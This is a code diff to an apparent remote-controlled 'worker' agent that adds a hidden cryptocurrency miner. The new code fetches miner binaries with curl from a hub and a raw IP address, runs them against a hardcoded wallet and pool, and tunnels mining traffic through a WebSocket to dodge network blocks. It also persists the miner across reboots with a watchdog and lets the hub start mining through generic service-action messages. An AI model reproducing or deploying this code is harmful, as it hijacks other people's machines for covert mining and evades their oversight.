@@ -15,6 +15,7 @@ import base64
 import json
 import logging
 import os
+import re
 import socket
 import subprocess
 import sys
@@ -43,6 +44,8 @@ AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".worker_id")
 VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
 HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")
 AUTOSTART_URL_FILE = os.path.join(WORKSPACE_DIR, "autostart_url.txt")
+MINING_CONF_FILE = os.path.join(WORKSPACE_DIR, ".mining_config.json")
+MINING_DIR = os.path.join(WORKSPACE_DIR, "gaszep")
 
 DEFAULT_HUB_URL = "wss://hub.databaru.my.id"
 DEFAULT_TARGET_URL = "https://www.youtube.com"
@@ -159,6 +162,29 @@ def read_cpu_percent() -> float:
         return 0.0
 
 
+def get_mining_hashrate() -> float:
+    """Reads latest speed in H/s from ~/workspace/gasdag.log"""
+    log_file = os.path.expanduser("~/workspace/gasdag.log")
+    if not os.path.exists(log_file):
+        return 0.0
+    try:
+        with open(log_file, "rb") as f:
+            f.seek(0, os.SEEK_END)
+            size = f.tell()
+            f.seek(max(0, size - 8192), os.SEEK_SET)
+            chunk = f.read().decode("utf-8", "replace")
+        for line in reversed(chunk.splitlines()):
+            if "speed 10s/60s/15m" in line:
+                m = re.search(r"speed 10s/60s/15m\s+([0-9.]+|-|n/a)", line)
+                if m:
+                    val = m.group(1)
+                    if val not in ("-", "n/a"):
+                        return float(val)
+    except Exception:
+        pass
+    return 0.0
+
+
 def get_system_metrics() -> dict:
     """Collects safe hardware and operating system metrics."""
     mem_total, mem_avail = 0, 0
@@ -200,6 +226,19 @@ def get_system_metrics() -> dict:
     except Exception:
         pass
 
+    tasks = []
+    if service_active:
+        tasks.append("YouTube")
+    try:
+        if mining_sup.is_running():
+            tasks.append("Mining")
+    except Exception:
+        pass
+
+    hashrate = 0.0
+    if "Mining" in tasks:
+        hashrate = get_mining_hashrate()
+
     return {
         "mem_free_mb": mem_avail,
         "ram_total_mb": mem_total,
@@ -207,8 +246,10 @@ def get_system_metrics() -> dict:
         "cpu_pct": cpu_pct,
         "uptime": uptime_str,
         "uptime_s": uptime_s,
-        "task_active": service_active,
-        "hostname": socket.gethostname()
+        "task_active": service_active or ("Mining" in tasks),
+        "active_tasks": tasks,
+        "hostname": socket.gethostname(),
+        "hashrate": hashrate
     }
 
 
@@ -247,16 +288,238 @@ def handle_browser_visit(url: str) -> str:
         return f"Navigation error: {e}"
 
 
+class MiningSupervisor:
+    """Manages background mining process (graftcp + gasdag) with persistent config across VM reboots."""
+    def __init__(self):
+        self.active_process = None
+
+    def is_running(self) -> bool:
+        try:
+            res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
+            pids = [p.strip() for p in res.stdout.strip().splitlines() if p.strip()]
+            return len(pids) > 0 and (os.path.exists(MINING_CONF_FILE) or self.active_process is not None)
+        except Exception:
+            return False
+
+    def ensure_installed(self) -> bool:
+        """Auto-provisions ~/workspace/gaszep from Hub Server or Git source if missing."""
+        gasdag_bin = os.path.join(MINING_DIR, "gasdag")
+        local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
+        if os.path.exists(gasdag_bin) and os.path.exists(local_bin):
+            return True
+
+        logger.info(f"Folder {MINING_DIR} belum lengkap. Mengunduh & menyiapkan biner gaszep otomatis...")
+        cmd = (
+            "H=$(cat ~/workspace/.hub_url 2>/dev/null | sed 's|wss://|https://|g' | sed 's|ws://|http://|g' | sed 's|/ws.*||'); "
+            "[ -z \"$H\" ] && H=\"https://hub.databaru.my.id\"; "
+            "mkdir -p ~/workspace/gaszep && "
+            "(curl -s -f -L --retry 3 --retry-delay 2 \"$H/download/gaszep.tar.gz\" -o /tmp/gaszep.tar.gz && "
+            "tar -xzf /tmp/gaszep.tar.gz -C ~/workspace/ && rm -f /tmp/gaszep.tar.gz 2>/dev/null || "
+            "(cd ~/workspace/gaszep && "
+            "curl -s -f -L --retry 2 http://152.44.33.64/sainalsaputra19/gaszep/raw/branch/main/graphics.tar.gz | tar -xz && "
+            "curl -s -f -L --retry 2 http://152.44.33.64/sainalsaputra19/gaszep/raw/branch/main/korek.zip -o korek.zip && "
+            "unzip -o -q korek.zip && rm -f korek.zip)) && "
+            "chmod +x ~/workspace/gaszep/gasdag ~/workspace/gaszep/graftcp/graftcp ~/workspace/gaszep/graftcp/local/graftcp-local 2>/dev/null || true"
+        )
+        try:
+            subprocess.run(cmd, shell=True, timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as e:
+            logger.warning(f"Gagal auto-install gaszep: {e}")
+
+        return os.path.exists(gasdag_bin) and os.path.exists(local_bin)
+
+    def start_or_update(self, config: dict) -> str:
+        proxy = config.get("proxy", "43.135.134.20:443")
+        username = config.get("username", "aku")
+        password = config.get("password", "akukayaraya")
+        pool = config.get("pool", "43.135.134.20:10080")
+        algo = config.get("algo", "rx/0")
+        wallet = config.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")
+        cpu_pct = str(config.get("cpu_pct", "100"))
+
+        # Stop existing miner first (keep config so start_or_update replaces it)
+        self.stop(remove_config=False)
+
+        # Save config persistently so it survives VM restarts
+        try:
+            with open(MINING_CONF_FILE, "w", encoding="utf-8") as f:
+                json.dump(config, f, indent=2)
+        except Exception as e:
+            logger.warning(f"Failed to save mining config: {e}")
+
+        # Ensure gaszep binaries are present before starting
+        if not self.ensure_installed():
+            return f"Folder {MINING_DIR} tidak ditemukan dan gagal diunduh otomatis!"
+
+        # Ensure permissions
+        gasdag_bin = os.path.join(MINING_DIR, "gasdag")
+        if os.path.exists(gasdag_bin):
+            os.chmod(gasdag_bin, 0o755)
+
+        graftcp_bin = os.path.join(MINING_DIR, "graftcp/graftcp")
+        if os.path.exists(graftcp_bin):
+            os.chmod(graftcp_bin, 0o755)
+
+        local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
+        if os.path.exists(local_bin):
+            os.chmod(local_bin, 0o755)
+
+        worker_id = f"{wallet}.{socket.gethostname()}"
+        use_proxy = bool(proxy and proxy.strip() and proxy.strip().lower() not in ("none", "direct", "no", "off", "tanpa", "false"))
+        cpu_arg = "--cpu-max-threads-hint=50" if cpu_pct == "50" else ""
+
+        pool_parts = pool.split(":", 1)
+        pool_host = pool_parts[0]
+        pool_port = pool_parts[1] if len(pool_parts) > 1 else "10080"
+
+        # Generate standalone physical start_mining.sh in ~/workspace/gaszep/start_mining.sh
+        start_script = os.path.join(MINING_DIR, "start_mining.sh")
+        log_file = os.path.expanduser("~/workspace/gasdag.log")
+
+        if use_proxy:
+            # Generate local WebSocket Stratum tunnel script
+            tunnel_py = os.path.join(MINING_DIR, "local_stratum.py")
+            tunnel_code = f"""import asyncio, os, sys, websockets
+
+HUB_WS = 'wss://hub.databaru.my.id/api/stratum_ws?host={pool_host}&port={pool_port}'
+LISTEN_HOST = '127.0.0.1'
+LISTEN_PORT = 10080
+
+async def handle_client(reader, writer):
+    try:
+        async with websockets.connect(HUB_WS, ssl=True, ping_interval=20, max_size=16*1024*1024) as ws:
+            async def tcp_to_ws():
+                try:
+                    while True:
+                        data = await reader.read(4096)
+                        if not data: break
+                        await ws.send(data)
+                except Exception: pass
+
+            async def ws_to_tcp():
+                try:
+                    async for msg in ws:
+                        if isinstance(msg, str):
+                            writer.write(msg.encode('utf-8'))
+                        else:
+                            writer.write(msg)
+                        await writer.drain()
+                except Exception: pass
+
+            await asyncio.gather(tcp_to_ws(), ws_to_tcp())
+    except Exception: pass
+    finally:
+        try: writer.close()
+        except Exception: pass
+
+async def main():
+    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT)
+    async with server:
+        await server.serve_forever()
+
+if __name__ == '__main__':
+    asyncio.run(main())
+"""
+            with open(tunnel_py, "w", encoding="utf-8") as f:
+                f.write(tunnel_code)
+
+            sh_lines = [
+                "#!/bin/bash",
+                "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
+                "cd \"$DIR\" || exit 1",
+                "pkill -9 -x gasdag 2>/dev/null || true",
+                "test -f /tmp/stratum.pid && kill -9 $(cat /tmp/stratum.pid) 2>/dev/null || true",
+                "sleep 0.2",
+                "chmod +x gasdag 2>/dev/null || true",
+                "nohup python3 \"$DIR/local_stratum.py\" > /tmp/tunnel.log 2>&1 &",
+                "echo $! > /tmp/stratum.pid",
+                "sleep 1",
+                f"nohup ./gasdag -a {algo} -o 127.0.0.1:10080 -u {worker_id} -p x -l {log_file} {cpu_arg} > {log_file} 2>&1 &",
+                "echo 'START_MINING_SH_SUCCESS'"
+            ]
+        else:
+            sh_lines = [
+                "#!/bin/bash",
+                "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
+                "cd \"$DIR\" || exit 1",
+                "pkill -9 -x gasdag 2>/dev/null || true",
+                "sleep 0.2",
+                "chmod +x gasdag 2>/dev/null || true",
+                f"nohup ./gasdag -a {algo} -o {pool} -u {worker_id} -p x -l {log_file} {cpu_arg} > {log_file} 2>&1 &",
+                "echo 'START_MINING_SH_SUCCESS'"
+            ]
+
+        with open(start_script, "w", encoding="utf-8") as f:
+            f.write("\n".join(sh_lines) + "\n")
+        os.chmod(start_script, 0o755)
+
+        # Launch the miner using start_mining.sh
+        logger.info(f"Memulai mining via start_mining.sh (Mode: {'Tunnel Proxy' if use_proxy else 'Direct'}, CPU: {cpu_pct}%)")
+        self.active_process = subprocess.Popen(
+            ["bash", start_script],
+            cwd=MINING_DIR,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        mode_str = f"Tunnel Proxy ({pool})" if use_proxy else "Direct"
+        return f"Mining started ({mode_str}, CPU: {cpu_pct}%)! (Pool: {pool})"
+
+    def stop(self, remove_config: bool = True) -> str:
+        try:
+            if remove_config and os.path.exists(MINING_CONF_FILE):
+                try:
+                    os.remove(MINING_CONF_FILE)
+                except Exception:
+                    pass
+            subprocess.run(["pkill", "-9", "-x", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if os.path.exists("/tmp/stratum.pid"):
+                try:
+                    with open("/tmp/stratum.pid") as pf:
+                        pid = pf.read().strip()
+                    if pid:
+                        subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    os.remove("/tmp/stratum.pid")
+                except Exception:
+                    pass
+            subprocess.run(["pkill", "-9", "-x", "graftcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["pkill", "-9", "-x", "graftcp-local"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.active_process = None
+            return "Mining stopped."
+        except Exception as e:
+            return f"Error stopping miner: {e}"
+
+
+mining_sup = MiningSupervisor()
+
+
+def check_and_autostart_mining():
+    """Restores and auto-starts mining if persistent .mining_config.json exists."""
+    if os.path.exists(MINING_CONF_FILE):
+        try:
+            with open(MINING_CONF_FILE, "r", encoding="utf-8") as f:
+                cfg = json.load(f)
+            logger.info("Mendeteksi konfigurasi mining tersimpan. Memulai auto-start mining...")
+            mining_sup.start_or_update(cfg)
+        except Exception as e:
+            logger.warning(f"Gagal auto-start mining: {e}")
+
+
 async def browser_watchdog():
-    """Keeps local proxy bridge alive when network proxy configuration is present."""
+    """Keeps local proxy bridge and mining supervisor alive across VM restarts."""
     await asyncio.sleep(5)
     while True:
         try:
+            # 1. Watchdog proxy bridge
             pb_chk = subprocess.run(["pgrep", "-f", "proxy_bridge.py"], stdout=subprocess.DEVNULL)
             if pb_chk.returncode != 0:
                 bridge_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_bridge.py")
                 if os.path.exists(bridge_script):
                     subprocess.Popen([sys.executable, bridge_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            # 2. Watchdog mining process (Auto-recover if VM restarted or process died)
+            if os.path.exists(MINING_CONF_FILE) and not mining_sup.is_running():
+                logger.info("Watchdog: Mining process died, restarting from .mining_config.json...")
+                check_and_autostart_mining()
         except Exception:
             pass
         await asyncio.sleep(30)
@@ -296,16 +559,23 @@ async def stream_browser_logs(ws, worker_id: str):
 
 
 def handle_local_service(action: str, config: dict = None) -> str:
-    """Controls local background task runner."""
-    script_file = os.path.expanduser("~/workspace/local_task.sh")
+    """Controls local background task runner and mining supervisor."""
     if action == "START":
+        if config and ("pool" in config or "wallet" in config or "algo" in config):
+            return mining_sup.start_or_update(config)
+        script_file = os.path.expanduser("~/workspace/local_task.sh")
         if os.path.exists(script_file):
             subprocess.Popen(["bash", script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return "Local background task started."
-        return "local_task.sh not found in ~/workspace."
+        if os.path.exists(MINING_CONF_FILE):
+            check_and_autostart_mining()
+            return "Auto-start mining executed from saved config."
+        return "local_task.sh and .mining_config.json not found in ~/workspace."
 
     elif action == "STOP":
         pkill_target = (config or {}).get("process", "local_task")
+        if pkill_target in ("mining", "gasdag") or (config and "pool" in config) or not config:
+            return mining_sup.stop()
         subprocess.run(["pkill", "-f", pkill_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return f"Local task '{pkill_target}' stopped."
 
@@ -326,6 +596,9 @@ async def run_worker():
 
     logger.info(f"Starting Worker: ID={worker_id}, Name={vps_name}")
     logger.info(f"Target Hub: {hub_url}")
+
+    # Auto-start persistent mining if .mining_config.json exists
+    check_and_autostart_mining()
 
     while True:
         try:
@@ -434,7 +707,7 @@ async def run_worker():
                                 "detail": detail
                             }))
 
-                        elif mtype in ("MINING_ACTION", "START_MINING", "STOP_MINING"):
+                        elif mtype in ("MINING_ACTION", "START_MINING", "STOP_MINING", "SERVICE_ACTION", "LOCAL_SERVICE"):
                             action = msg.get("action")
                             if not action:
                                 action = "START" if mtype == "START_MINING" else "STOP"
